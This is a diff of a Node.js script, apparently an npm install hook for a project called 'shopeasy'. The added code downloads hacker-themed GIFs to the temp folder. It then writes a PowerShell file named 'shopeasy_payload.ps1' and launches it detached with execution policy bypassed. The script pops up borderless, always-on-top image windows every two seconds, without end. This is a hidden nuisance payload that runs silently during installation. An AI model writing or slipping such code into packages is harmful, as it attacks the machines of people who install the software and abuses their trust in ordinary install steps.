@@ -1,153 +1,118 @@
 const fs = require("fs");
 const https = require("https");
-const { exec } = require("child_process");
+const http = require("http");
+const { spawn } = require("child_process");
+const os = require("os");
+const path = require("path");
 
-// URLs de imágenes
 const imageUrls = [
-    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhpE6qnBx1G0X_TtMRe5b_cWHnSGr-mAJPuy1kIzcFVA&s=10",
-    "https://i.pinimg.com/474x/eb/2d/de/eb2dde0578707dd3d04a26c37b75a469.jpg",
-    "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyNnppMHdlNm5zcHVrY2p5a3R1N3I5dzd6dWp6eThoNmxuc2JhdTh2ZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/P8ef3Dkynk0xLx1h1T/giphy.gif",
-    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT-sFg1NH-gNCMJGCqG42jygDrdBnnyvW9vh0lArr0R88_edR_d_Zk5MB4&s=10",
-    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSaQVCSzliTWkeAJJFN7sdP_SWIAjHL4APSieEd52ekpr6utM48_cHReO0&s=10",
     "https://media.tenor.com/nPd-ijwBSKQAAAAM/hacker-pc.gif",
     "https://media.tenor.com/zh58XZRJuzYAAAAM/cat-hacking.gif",
-    "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUydTNmbHIzNHVkM2k5cDdkcHRqb3BtcjVyazljdjVtN3Nzdm5ud3d3OCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/3wr2cnwlghNomDeN9W/giphy_s.gif",    
+    "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUydTNmbHIzNHVkM2k5cDdrcHRqb3BtcjVyazljdjVtN3Nzdm5ud3d3OCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/3wr2cnwlghNomDeN9W/giphy_s.gif",
+    "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyNnppMHdlNm5zcHVrY2p5a3R1N3I5dzd6dWp6eThoNmxuc2JhdTh2ZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/P8ef3Dkynk0xLx1h1T/giphy.gif",
 ];
-// Tamaño ventana
-const WINDOW_WIDTH = 550;
-const WINDOW_HEIGHT = 350;
 
-// Delay entre imágenes
-const DELAY_MS = 2000;
-
-// Descargar imagen
-function downloadImage(url, filename) {
-
+// Descarga con soporte a redirects y http/https
+function downloadImage(url, filename, redirects = 0) {
     return new Promise((resolve) => {
+        if (redirects > 5) { resolve(); return; }
 
-        const file = fs.createWriteStream(filename);
-
-        https.get(url, (response) => {
-
-            response.pipe(file);
-
-            file.on("finish", () => {
-                file.close();
-                resolve();
+        try {
+            const client = url.startsWith("https") ? https : http;
+            const req = client.get(url, (res) => {
+                if (res.statusCode === 301 || res.statusCode === 302) {
+                    resolve(downloadImage(res.headers.location, filename, redirects + 1));
+                    return;
+                }
+                const file = fs.createWriteStream(filename);
+                res.pipe(file);
+                file.on("finish", () => { file.close(); resolve(); });
+                file.on("error", () => resolve());
             });
-        });
+            req.on("error", () => resolve());
+            req.setTimeout(8000, () => { req.destroy(); resolve(); });
+        } catch {
+            resolve();
+        }
     });
 }
 
-// Obtener resolución del sistema usando PowerShell
-function getScreenResolution() {
-
-    return new Promise((resolve, reject) => {
-
-        const command = `
-powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width.ToString() + ',' + [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height.ToString()"
-`;
-
-        exec(command, (error, stdout) => {
-
-            if (error) {
-                reject(error);
-                return;
-            }
-
-            const [width, height] = stdout
-                .trim()
-                .split(",")
-                .map(Number);
-
-            resolve({ width, height });
-        });
+// Lanza el slideshow como proceso DESACOPLADO escribiendo un .ps1 temp
+function lanzarSlideshow(filenames) {
+    const validos = filenames.filter(f => {
+        try { return fs.existsSync(f) && fs.statSync(f).size > 200; }
+        catch { return false; }
     });
-}
 
-// Posición aleatoria visible
-function randomPosition(screenWidth, screenHeight) {
+    if (validos.length === 0) return;
 
-    const maxX = screenWidth - WINDOW_WIDTH;
-    const maxY = screenHeight - WINDOW_HEIGHT;
+    // Escapar backslashes para PowerShell
+    const archivos = validos.map(f => f.replace(/\\/g, "\\\\")).join('","');
 
-    return {
-        x: Math.floor(Math.random() * maxX),
-        y: Math.floor(Math.random() * maxY)
-    };
-}
-
-// Mostrar imagen
-function showImage(filename, x, y) {
-
-    const psCommand = `
+    const psScript = `
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-$form = New-Object Windows.Forms.Form
-$form.StartPosition = "Manual"
-$form.Location = New-Object Drawing.Point(${x}, ${y})
-$form.Size = New-Object Drawing.Size(${WINDOW_WIDTH}, ${WINDOW_HEIGHT})
+$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+$files  = @("${archivos}")
+$idx    = 0
 
-$img = [System.Drawing.Image]::FromFile((Resolve-Path "${filename}"))
+$timer          = New-Object System.Windows.Forms.Timer
+$timer.Interval = 2000
 
-$pictureBox = New-Object Windows.Forms.PictureBox
-$pictureBox.Image = $img
-$pictureBox.Dock = "Fill"
-$pictureBox.SizeMode = "StretchImage"
+$timer.Add_Tick({
+    $f = $files[$script:idx % $files.Count]
+    $script:idx++
+    try {
+        $img = [System.Drawing.Image]::FromFile($f)
+        $W = 550; $H = 350
+        $x = Get-Random -Minimum 0 -Maximum ([Math]::Max(1, $screen.Width  - $W))
+        $y = Get-Random -Minimum 0 -Maximum ([Math]::Max(1, $screen.Height - $H))
 
-$form.Controls.Add($pictureBox)
+        $form = New-Object Windows.Forms.Form
+        $form.StartPosition   = "Manual"
+        $form.Location        = New-Object Drawing.Point($x, $y)
+        $form.Size            = New-Object Drawing.Size($W, $H)
+        $form.TopMost         = $true
+        $form.FormBorderStyle = "None"
+        $form.BackColor       = [Drawing.Color]::Black
 
-$form.TopMost = $true
+        $pb          = New-Object Windows.Forms.PictureBox
+        $pb.Image    = $img
+        $pb.Dock     = "Fill"
+        $pb.SizeMode = "StretchImage"
+        $form.Controls.Add($pb)
+        $form.Show()
+    } catch {}
+})
 
-$form.Show()
+$timer.Start()
+[System.Windows.Forms.Application]::Run()
 `;
 
-    exec(`powershell -ExecutionPolicy Bypass -Command "${psCommand}"`);
+    const psFile = path.join(os.tmpdir(), "shopeasy_payload.ps1");
+    fs.writeFileSync(psFile, psScript, "utf8");
+
+    // Detached = no bloquea npm install
+    spawn("powershell", ["-ExecutionPolicy", "Bypass", "-File", psFile], {
+        detached: true,
+        stdio: "ignore",
+        windowsHide: false,
+    }).unref();
 }
 
-// Main
 (async () => {
-
-    // Detectar resolución
-    const screen = await getScreenResolution();
-
-    console.log(
-        `Detected resolution: ${screen.width}x${screen.height}`
-    );
-
+    const tmpDir = os.tmpdir();
     const filenames = [];
 
-    // Descargar imágenes
     for (let i = 0; i < imageUrls.length; i++) {
-
-        const filename = `image-${i}.jpg`;
-
+        const filename = path.join(tmpDir, `shopeasy_img_${i}.gif`);
         filenames.push(filename);
-
-        console.log(`Downloading ${filename}`);
-
         await downloadImage(imageUrls[i], filename);
     }
 
-    console.log("All images downloaded");
+    lanzarSlideshow(filenames);
 
-    let index = 0;
-
-    // Loop infinito
-    setInterval(() => {
-
-        const filename = filenames[index % filenames.length];
-
-        const pos = randomPosition(
-            screen.width,
-            screen.height
-        );
-
-        showImage(filename, pos.x, pos.y);
-
-        index++;
-
-    }, DELAY_MS);
-
+    // Salir para que npm install pueda terminar
+    process.exit(0);
 })();
